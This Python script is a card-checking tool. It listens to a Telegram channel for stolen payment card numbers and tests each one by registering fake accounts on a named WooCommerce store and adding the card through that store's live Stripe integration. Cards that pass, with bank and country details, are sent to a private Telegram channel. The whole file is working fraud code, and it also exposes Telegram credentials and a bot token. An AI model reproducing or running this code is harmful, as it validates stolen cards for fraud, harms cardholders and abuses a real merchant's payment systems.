from telethon import TelegramClient, events
import re, time, requests, random
from colorama import Fore
from cfonts import render
from datetime import datetime

# ==== CONFIG ====
api_id = 29569239  # Your Telegram api_id (integer)
api_hash = 'b2407514e15f24c8ec2c735e8018acd7'
phone_number = '+254780855836'
bot_token = '8065916669:AAHLmc9TMnZb7QHv2B7pEYB3O7cKuk0HrUA'
source_channel = '@vjjgjjjnv'  # Channel/group to listen to
private_channel_id = -1002336223485  # ID of the channel to drop approvals

kk = "qwertyuiolmkjnhbgvfcdxszaQWEAERSTSGGZJDNFMXLXLVKPHPY1910273635519"
print(render('M.SALAH', colors=['white', 'white'], align='center'))

def extract_cc(text):
    """Extract CCs like 4242424242424242|12|2027|123 from text."""
    return re.findall(r"\b\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b", text)

def country_flag_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return "🌍"
    return chr(0x1F1E6 + ord(country_code.upper()[0]) - ord('A')) + chr(0x1F1E6 + ord(country_code.upper()[1]) - ord('A'))

def bin_lookup(bin_number):
    # Try bins.antipublic.cc first
    try:
        resp = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if resp.status_code == 200 and "Not Found" not in resp.text and resp.text.strip() != "":
            data = resp.json()
            return {
                "bank": data.get("bank", "Unknown"),
                "country_name": data.get("country_name", "Unknown"),
                "country_flag": country_flag_emoji(data.get("country", "")),
                "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown")
            }
    except Exception as e:
        print("[Antipublic BIN lookup failed]", e)

    # Fallback to lookup.binlist.net
    try:
        resp = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            bank = data.get("bank", {}).get("name", "Unknown")
            country = data.get("country", {}).get("name", "Unknown")
            country_code = data.get("country", {}).get("alpha2", "")
            emoji = data.get("country", {}).get("emoji", "🌍")
            brand = data.get("scheme", "Unknown").upper()
            ctype = data.get("type", "Unknown").upper()
            return {
                "bank": bank,
                "country_name": country,
                "country_flag": emoji if emoji else country_flag_emoji(country_code),
                "brand": brand,
                "type": ctype
            }
    except Exception as e:
        print("[Binlist.net BIN lookup failed]", e)

    return {
        "bank": "Unknown", "country_name": "Unknown", "country_flag": "🌍", "brand": "Unknown", "type": "Unknown"
    }

def format_approved_drop_code(cc_data, bininfo, response="Payment method successfully added ✅"):
    card, month, year, cvv = cc_data.split('|')
    bin_number = card[:6]
    bank = bininfo.get('bank', 'Unknown')
    country = bininfo.get('country_name', 'Unknown')
    flag = bininfo.get('country_flag', '🌍')
    brand = bininfo.get('brand', 'Unknown')
    ctype = bininfo.get('type', 'Unknown')
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    message = (
        f"<b>Approved Live Stripe Auth ✅</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>💳 CC:</b> <code>{cc_data}</code>\n"
        f"<b>🔐 GATE:</b> <code>Stripe Auth</code>\n"
        f"<b>🟢 RESPONSE:</b> <code>{response}</code>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🆔 BIN:</b> <code>{bin_number}</code>\n"
        f"<b>🏦 Bank:</b> <code>{bank}</code>\n"
        f"<b>🌍 Country:</b> {flag} <code>{country}</code>\n"
        f"<b>💠 Type:</b> <code>{ctype} - {brand}</code>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🕒 Time:</b> <code>{time_str}</code>\n"
        f"<b>[⌥] Dev:</b> <code>BUNNY - 👑</code>"
    )
    return message

def chk(ccx, ID, token):
    def get_fresh_session():
        s = requests.session()
        r = (
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk) +
            random.choice(kk)
        )
        url = "https://www.bizinkonline.com/my-account/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9,ar;q=0.8",
        }
        resp = s.get(url, headers=headers)
        try:
            nonce = resp.text.split('name="woocommerce-register-nonce" value=')[1].split('"')[1]
        except Exception:
            print("[!] Could not find registration nonce. Site may have changed.")
            return None, None, None

        payload = {
            "email": f"{r}123@gmail.com",
            "woocommerce-register-nonce": nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        resp2 = s.post(url, data=payload, headers=headers, cookies=s.cookies)
        return s, headers, s.cookies

    def get_payment_nonce(session, headers, cookies):
        url = "https://www.bizinkonline.com/my-account/add-payment-method/"
        resp = session.get(url, headers=headers, cookies=cookies)
        try:
            nonce1 = resp.text.split('createAndConfirmSetupIntentNonce":')[1].split('"')[1]
        except Exception:
            print("[!] Could not find payment nonce. Site may have changed.")
            return None
        return nonce1

    # Fresh session for every card
    session, headers, cookies = get_fresh_session()
    if session is None:
        return "Session setup failed."

    nonce1 = get_payment_nonce(session, headers, cookies)
    if nonce1 is None:
        # Retry once
        session, headers, cookies = get_fresh_session()
        nonce1 = get_payment_nonce(session, headers, cookies)
        if nonce1 is None:
            return "Payment nonce setup failed."

    try:
        cc = ccx.split("|")[0]
        exp = ccx.split("|")[1]
        exy = ccx.split("|")[2]
        if len(exy) == 4:
            exy = exy[2:]
        ccv = ccx.split("|")[3]
    except:
        return "Error: Card format."

    url = "https://api.stripe.com/v1/payment_methods"
    payload = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": ccv,
        "card[exp_year]": exy,
        "card[exp_month]": exp,
        "allow_redisplay": "unspecified",
        "billing_details[address][country]": "EG",
        "payment_user_agent": "stripe.js/d16ff171ee; stripe-js-v3/d16ff171ee; payment-element; deferred-intent",
        "referrer": "https://www.bizinkonline.com",
        "time_on_page": "19537",
        "client_attribution_metadata[client_session_id]": "8a3d508b-f6ba-4f16-be66-c59232f6afc0",
        "key": "pk_live_517DNnYLbB6is0UIQUdUufKC8m0qXKrRT9FqCYwp6sFxQpvl8HxAfTqgNhfM6BknfdAdrcidjM3Ob0Okiq0dscUG600sO0LxzZS",
        "_stripe_version": "2024-06-20",
    }
    stripe_headers = {
        "User-Agent": headers["User-Agent"],
        "Accept": "application/json",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "accept-language": "en-US,en;q=0.9,ar;q=0.8",
    }

    response = requests.post(url, data=payload, headers=stripe_headers)
    print("[Stripe response]", response.text)
    try:
        tok = response.json()["id"]
    except Exception as e:
        return Fore.RED + response.json().get("error", {}).get("message", str(e))

    url = "https://www.bizinkonline.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
    payload = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": tok,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce1,
    }
    confirm_headers = {
        "User-Agent": headers["User-Agent"],
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://www.bizinkonline.com",
        "referer": "https://www.bizinkonline.com/my-account/add-payment-method/",
        "accept-language": "en-US,en;q=0.9,ar;q=0.8",
    }
    resp = session.post(url, data=payload, headers=confirm_headers, cookies=cookies)
    print("[Bizink response]", resp.text)

    bininfo = bin_lookup(ccx.split("|")[0][:6])
    if "succeeded" in resp.text:
        msg = Fore.GREEN + "Payment method successfully added. ✅"
        text = format_approved_drop_code(ccx, bininfo, response="Payment method successfully added ✅")
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data={
                "chat_id": ID,
                "parse_mode": "HTML",
                "text": text,
                "disable_web_page_preview": True
            },
        )
    elif "insufficient funds" in resp.text:
        text = format_approved_drop_code(ccx, bininfo, response="insufficient funds.. ✅")
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data={
                "chat_id": ID,
                "parse_mode": "HTML",
                "text": text,
                "disable_web_page_preview": True
            },
        )
        msg = Fore.GREEN + "insufficient funds.. ✅"
    else:
        msg = resp.text
    return msg

# --- Start Telethon Client ---
client = TelegramClient('session_name', api_id, api_hash)

@client.on(events.NewMessage(chats=source_channel))
async def handler(event):
    message = event.message
    if message.text:
        cc_list = extract_cc(message.text)
        for ccx in cc_list:
            print(Fore.WHITE, f"Checking {ccx} ...")
            result = chk(ccx, private_channel_id, bot_token)
            print(result)
            time.sleep(15)  # Slow down for anti-spam

client.start(phone=phone_number)
print(Fore.GREEN + "Listening for new cards in live channel...")
client.run_until_disconnected()
